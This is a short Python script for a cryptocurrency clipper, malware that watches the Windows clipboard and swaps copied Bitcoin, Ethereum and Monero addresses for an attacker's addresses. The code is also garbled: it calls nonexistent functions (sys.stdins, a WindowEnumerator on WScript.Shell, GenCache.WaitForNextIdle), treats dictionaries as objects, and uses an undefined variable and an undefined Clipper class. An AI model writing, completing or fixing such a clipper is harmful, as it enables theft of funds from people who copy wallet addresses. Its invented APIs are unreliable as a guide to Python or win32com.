import sys
import threading
import re
import win32com.client.gencache

# Define variables and functions
config = {
    "bitcoin_address": "",
    "etherium_address": "",
    "monero_address": ""
}

PatternRegex = {
    "btc": re.compile(r"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"),
    "eth": re.compile(r"\b0x[a-fA-F0-9]{40}\b"),
    "xmr": re.compile(r"\b4([0-9]|[A-B])(.){93}\b")
}

Clipboard = {
    "get_text": lambda: sys.stdins.getvalue(),
    "set_text": lambda text: sys.stdins.setvalue(text)
}

NativeMethods = {
    "WM_CLIPBOARDUPDATE": 0x031D,
    "HWND_MESSAGE": -3
}

class ClipboardNotification(object):
    def __init__(self):
        self.handle = win32com.client.gencache.CreateObject("WScript.Shell").CreateObject("WScript.Shell").WindowEnumerator()[0]
        NativeMethods.SetParent(self.handle, NativeMethods.HWND_MESSAGE)
        NativeMethods.AddClipboardFormatListener(self.handle)

    def RegexResult(self, pattern):
        if pattern.match(Clipboard.get_text()) is not None:
            return True
        else:
            return False

    def WndProc(self, message):
        if message.Msg == NativeMethods.WM_CLIPBOARDUPDATE:
            Clipboard.get_text()

            if PatternRegex[pattern].match(Clipboard.get_text()) is not None:
                result = PatternRegex[pattern].replace(Clipboard.get_text(), config[pattern])
                Clipboard.set_text(result)
                print(f" Replaced {pattern} address {Clipboard.get_text()} to {config[pattern]}")

    def __del__(self):
        NativeMethods.RemoveClipboardFormatListener(self.handle)
        win32com.client.gencache.GenCache.RemoveObject(self.handle)

# Run the thread
Run = Clipper.Run()

while True:
    # Wait for the next update
    win32com.client.gencache.GenCache.WaitForNextIdle(100)
